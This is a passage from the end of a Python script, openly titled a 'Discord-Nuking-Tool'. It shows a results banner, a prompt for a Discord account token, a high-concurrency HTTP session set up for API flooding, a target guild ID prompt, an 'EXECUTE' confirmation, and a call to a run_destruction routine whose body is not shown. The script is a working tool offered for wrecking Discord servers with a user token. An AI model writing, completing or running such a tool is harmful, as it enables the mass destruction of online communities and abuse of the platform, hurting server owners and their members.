    print(clr(f"  │  Target         : ", Color.GR) + clr(f"{guild_name} ({guild_id})", Color.W1))
    print(clr(f"  │  Owner          : ", Color.GR) + clr(owner_id, Color.R2))
    print(clr(f"  │  Timestamp      : ", Color.GR) + clr(time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime()), Color.W1))
    
    print(clr(f"\n{'▓'*80}", Color.B1, bold=True))
    
    if success_rate >= 98:
        print(clr(f"  [STATUS] ✓ COMPLETE", Color.G1, bold=True, blink=True))
    elif success_rate >= 90:
        print(clr(f"  [STATUS] ⚠ PARTIAL", Color.Y1, bold=True))
    elif success_rate >= 70:
        print(clr(f"  [STATUS] ⚠ LIMITED", Color.R4, bold=True))
    else:
        print(clr(f"  [STATUS] ✗ MINIMAL", Color.R1, bold=True))
    
    print(clr(f"{'▓'*80}\n", Color.B1, bold=True))

# ═══════════════════════════════════════════════════════════════════════════
# Entry Point
# ═══════════════════════════════════════════════════════════════════════════

async def main():
    print(clr("""
███████╗ █████╗ ██████╗ ██╗  ██╗   ██╗
██╔════╝██╔══██╗██╔══██╗██║  ╚██╗ ██╔╝
█████╗  ███████║██████╔╝██║   ╚████╔╝ 
██╔══╝  ██╔══██║██╔══██╗██║    ╚██╔╝  
███████╗██║  ██║██║  ██║███████╗██║   
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   
  Discord-Nuking-Tool. Dev: ZeZe
""", Color.R1, bold=True))
    
    token = getpass.getpass(clr("Enter your Discord account token [It will not be visible]: ", Color.W1)).strip()
    
    if not re.match(r'^[A-Za-z0-9_\-\.]{24,}\.[A-Za-z0-9_\-\.]{6,}\.[A-Za-z0-9_\-\.]{27,}$', token):
        print(clr("[✗] INVALID TOKEN FORMAT", Color.R1, bold=True))
        return
    
    connector = TCPConnector(
        limit=0,
        limit_per_host=2000,
        force_close=False,
        ttl_dns_cache=600,
        enable_cleanup_closed=True
    )
    timeout = ClientTimeout(total=None, connect=0.8, sock_read=1.5)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        headers = HeaderPool(token)
        
        valid, user_id = await validate_token(session, token, headers)
        if not valid:
            return
        
        while True:
            guild_id = input(clr("\nGuild ID: ", Color.W1)).strip()
            
            if not guild_id.isdigit():
                print(clr("[✗] INVALID GUILD ID", Color.R1))
                continue
            
            confirm = input(clr("\nType 'EXECUTE' to proceed\n> ", Color.R1, bold=True)).strip()
            
            if confirm != "EXECUTE":
                print(clr("[!] ABORTED", Color.Y1))
                if input(clr("\nContinue? [Y/N]: ", Color.B1)).strip().upper() != "Y":
                    break
                os.system('cls' if os.name == 'nt' else 'clear')
                continue
            
            await run_destruction(session, headers, guild_id, user_id)
            
            if input(clr("\nContinue? [Y/N]: ", Color.B1)).strip().upper() != "Y":
                print(clr("\n[✓] EXIT", Color.G1, bold=True))
                break
            
            os.system('cls' if os.name == 'nt' else 'clear')
            print(clr("""
███████╗ █████╗ ██████╗ ██╗  ██╗   ██╗
██╔════╝██╔══██╗██╔══██╗██║  ╚██╗ ██╔╝
█████╗  ███████║██████╔╝██║   ╚████╔╝ 
██╔══╝  ██╔══██║██╔══██╗██║    ╚██╔╝  
███████╗██║  ██║██║  ██║███████╗██║   
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   
        Discord Nuker - ZeZe
""", Color.R1, bold=True))

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(clr("\n\n[!] INTERRUPTED", Color.R4, bold=True))